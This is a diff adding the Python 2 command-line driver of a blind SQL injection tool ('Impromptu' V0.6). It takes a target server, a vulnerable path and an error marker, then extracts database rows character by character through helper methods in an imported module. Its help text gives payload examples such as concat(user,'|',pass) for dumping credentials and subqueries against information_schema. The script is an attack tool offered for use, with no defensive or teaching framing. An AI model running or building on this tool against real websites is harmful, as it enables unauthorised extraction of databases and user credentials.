@@ -1,0 +1,116 @@
+#!/usr/bin/env python
+from classes import *
+import argparse
+
+#--------------------#
+#Parseo de argumentos#
+#--------------------#
+
+parser = argparse.ArgumentParser(description='Blind SQL Injection Tool')
+parser.add_argument('--server', '-s',  help='Server name [ex. www.google.com]', required=True)
+parser.add_argument('--path', '-p',  help='Exploitable path [ex. /dev/app/fotos/3]', required=True)
+parser.add_argument('--eval', '-e',  help='Evaluate success(1)', action='store_true')
+parser.add_argument('--text', '-t',  help='Evaluation text [ex. You have an error in your SQL syntax]', required=True)
+parser.add_argument('--field', '-f',  help='Field or concat fields to retrieve [ex. table_name, concat(user,\'|\',pass)]', required=True)
+parser.add_argument('--table', '-l',  help='Table name or query as table [ex. tbl_users, (SELECT table_name from information_schema.tables) as t]', required=True)
+parser.add_argument('--comments', '-c',  help='End query with [ex. --, ;--, //]', required=True)
+args = parser.parse_args()
+
+if args.server:
+    server_name = args.server
+
+if args.path:
+    injection_path = args.path
+
+if args.eval:
+    evl = True
+else:
+    evl = False
+
+if args.text:
+    text = args.text
+
+if args.field:
+    field_name = args.field
+    field_name = field_name.replace(' ', '+')
+
+if args.table:
+    table_name = args.table
+    table_name = table_name.replace(' ', '+')
+
+if args.comments:
+    comments = args.comments
+    comments = comments.replace(' ', '+')
+    
+#	---
+print"""
+# MySQL
+#       .----.                                                 
+#         /   `                                        /       
+#        .  .-. .-.    .--.).--.-._.  .-. .-.    .----/--)  (  
+#       / )/   )   )   /  /   (   ) )/   )   )   /  )/  (    ) 
+#      / '/   /   (   /`-/     `-' '/   /   (   /`-'/    `--': 
+# .---------'      `-/                       `-/          V0.6
+#                                 Sys_A501 @ Raza-mexicana.org
+#
+# Just another "blind SQL injection" script...
+# Based on http://websec.ca/kb/sql_injection
+"""
+
+############################
+# Getting injection params #
+############################
+#server_name = raw_input("Server name [ex. www.google.com]: ")
+#injection_path	= raw_input("Exploitable path [ex. /dev/app/fotos/3]: ")
+
+#evl = raw_input("Evaluate success(1) or error(0) [default 0]: ")
+#evl = bool(evl)
+#text = raw_input("Evaluation text [ex. You have an error in your SQL syntax]: ")
+
+#field_name = raw_input("Field or concat fields to retrieve [ex. table_name, concat(user,'|',pass)]: ")
+#field_name = field_name.replace(' ', '+')
+
+#table_name = raw_input("Table name or query as table [ex. tbl_users, (SELECT table_name from information_schema.tables) as t]: ")
+#table_name = table_name.replace(' ', '+')
+
+#comments = raw_input("End query with [ex. --, ;--, //]: ")
+#comments = comments.replace(' ', '+')
+
+#	Definning core
+core = Impromptu()
+
+#	Counting rows
+print "\n\n\t--> tic, toc, toc, toc... Lets play!\n"
+rowsLimit = core.getRowsNum_bj(server_name, injection_path, field_name, table_name, evl, text, comments)
+print "\n"+str(rowsLimit)+" rows..."
+rowContent = ""
+allRows = []
+
+print "\n-\tRetrieving rows:"
+
+if rowsLimit > 0:
+	for row in range(0, rowsLimit):
+#	Getting each row length
+		rLen = core.getLength_bj(server_name, injection_path, row, field_name, table_name, evl, text, comments)
+		print "\nRow "+str(row)+' has '+str(rLen)+' chars.'
+		rowContent = ""
+#	Getting each char
+		for char in range(1, rLen+1):
+			aChar = core.getChar_bj(server_name, injection_path, row, char, field_name, table_name, evl, text, comments); #	Getting a selected char
+			print aChar, #	Printing char
+			rowContent += aChar; #	Concat to the others...
+			pass
+		allRows.append(rowContent) #	Saving field
+		pass
+	pass
+
+#	Printing values
+print """\n\n
+--------------------------------
+Retrieved values:
+--------------------------------
+"""
+
+for rowContent in allRows:
+	print "-\t"+rowContent
+	pass
